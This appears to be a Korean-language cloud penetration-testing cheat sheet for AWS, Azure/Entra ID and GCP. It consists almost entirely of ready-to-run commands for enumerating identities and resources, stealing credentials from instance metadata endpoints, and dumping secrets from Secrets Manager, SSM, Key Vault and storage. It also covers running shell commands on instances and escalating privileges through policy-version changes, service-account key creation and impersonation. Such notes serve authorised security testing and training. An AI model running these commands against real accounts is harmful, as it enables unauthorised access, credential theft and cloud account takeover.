# Cloud 공격

---

## AWS

### 초기 열거

```bash
aws sts get-caller-identity
aws iam get-user
aws iam list-attached-user-policies --user-name USER
aws iam list-users
aws iam list-roles
```

### IAM 열거

```bash
# 정책 세부 확인
aws iam get-policy-version --policy-arn ARN --version-id V

# 인라인 정책
aws iam get-user-policy --user-name USER --policy-name POLICY

# 역할 정책
aws iam list-attached-role-policies --role-name ROLE

# 자동 열거
python3 enumerate-iam.py --access-key AKIA... --secret-key SECRET
```

### EC2 Metadata (SSRF)

```bash
# IMDSv1
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE

# 획득한 credential 설정
export AWS_ACCESS_KEY_ID=KEY
export AWS_SECRET_ACCESS_KEY=SECRET
export AWS_SESSION_TOKEN=TOKEN

# IMDSv2 (토큰 필요)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/
```

### S3

```bash
aws s3 ls
aws s3 ls s3://BUCKET
aws s3 ls s3://BUCKET --no-sign-request       # 익명 접근
aws s3 cp s3://BUCKET/KEY ./
aws s3api get-bucket-policy --bucket BUCKET
aws s3api get-bucket-acl --bucket BUCKET
```

### Lambda

```bash
aws lambda list-functions
aws lambda get-function --function-name FUNC
aws lambda get-function-configuration --function-name FUNC | jq '.Environment'
```

### Secrets Manager / SSM

```bash
# Secrets Manager
aws secretsmanager list-secrets
aws secretsmanager get-secret-value --secret-id SECRET

# SSM Parameter Store
aws ssm describe-parameters
aws ssm get-parameter --name PARAM --with-decryption
aws ssm get-parameters-by-path --path / --recursive --with-decryption

# SSM 명령 실행 (EC2)
aws ssm send-command --instance-ids ID \
  --document-name "AWS-RunShellScript" --parameters commands="whoami"
```

### 권한 상승

```bash
# 정책 버전 변경 (이전 버전에 더 많은 권한)
aws iam list-policy-versions --policy-arn ARN
aws iam set-default-policy-version --policy-arn ARN --version-id v1

# 새 정책 버전 생성 (iam:CreatePolicyVersion)
aws iam create-policy-version --policy-arn ARN \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
  --set-as-default
```

### 도구

| 도구 | 용도 |
|------|------|
| pacu | AWS 공격 프레임워크 |
| enumerate-iam | IAM 권한 열거 |
| ScoutSuite | 클라우드 보안 감사 |
| Prowler | AWS 보안 점검 |

---

## Azure / Entra ID

### 초기 열거

```bash
az account show
az ad signed-in-user show
az account tenant list
```

### Entra ID 열거

```bash
az ad user list --output table
az ad group list --output table
az ad group member list --group "GROUP" --output table
az ad app list --query "[].{Name:displayName,AppId:appId}" --output table
az ad sp list --all --output table
```

### 리소스 열거

```bash
az group list --output table
az resource list --output table
az vm list -d --output table
az storage account list --output table
az keyvault list --output table
```

### Storage Account

```bash
# 키 확인
az storage account keys list --account-name ACCOUNT

# Blob 열거/다운로드
az storage container list --account-name ACCOUNT --account-key KEY --output table
az storage blob list --container-name CONTAINER --account-name ACCOUNT --account-key KEY --output table
az storage blob download --container-name CONTAINER --name BLOB --file ./out \
  --account-name ACCOUNT --account-key KEY

# 익명 접근
curl https://ACCOUNT.blob.core.windows.net/CONTAINER/BLOB
```

### Key Vault

```bash
az keyvault secret list --vault-name VAULT --output table
az keyvault secret show --vault-name VAULT --name SECRET
```

### 권한 상승

```bash
# 역할 확인
az role assignment list --all --output table

# VM 메타데이터 토큰 (VM 내부)
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

### 도구

| 도구 | 용도 |
|------|------|
| ROADtools | Azure AD 열거 |
| AzureHound | Azure 공격 경로 분석 |
| MicroBurst | Azure 보안 감사 |
| GraphRunner | Microsoft Graph API 공격 |

---

## GCP

### 초기 열거

```bash
gcloud auth activate-service-account --key-file=key.json
gcloud projects list
gcloud config set project PROJECT_ID
gcloud projects get-iam-policy PROJECT_ID
gcloud iam service-accounts list
```

### Compute Engine

```bash
gcloud compute instances list

# 메타데이터 (인스턴스 내부)
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

gcloud compute ssh INSTANCE --zone ZONE
gcloud compute instances get-serial-port-output INSTANCE --zone ZONE
```

### Cloud Storage

```bash
gsutil ls
gsutil ls -r gs://BUCKET/
gsutil iam get gs://BUCKET/
curl https://storage.googleapis.com/BUCKET/
gsutil cp gs://BUCKET/secret.txt ./
```

### 권한 상승

```bash
# 서비스 계정 키 생성
gcloud iam service-accounts keys create key.json --iam-account=SA_EMAIL

# impersonation
gcloud auth print-access-token --impersonate-service-account=SA_EMAIL
```

### 도구

| 도구 | 용도 |
|------|------|
| GCPBucketBrute | GCS 버킷 열거 |
| ScoutSuite | 멀티 클라우드 감사 |

---

## 크로스 클라우드 비교

| 항목 | AWS | Azure | GCP |
|------|-----|-------|-----|
| CLI | aws | az | gcloud |
| IAM 열거 | iam list-users | ad user list | iam service-accounts list |
| 메타데이터 | 169.254.169.254 | 169.254.169.254 | metadata.google.internal |
| 스토리지 | S3 | Blob Storage | Cloud Storage |
| Serverless | Lambda | Functions | Cloud Functions |
| ID 확인 | sts get-caller-identity | account show | auth list |
| 공격 도구 | pacu | ROADtools/AzureHound | GCPBucketBrute |
| 감사 도구 | Prowler | ScoutSuite | ScoutSuite |
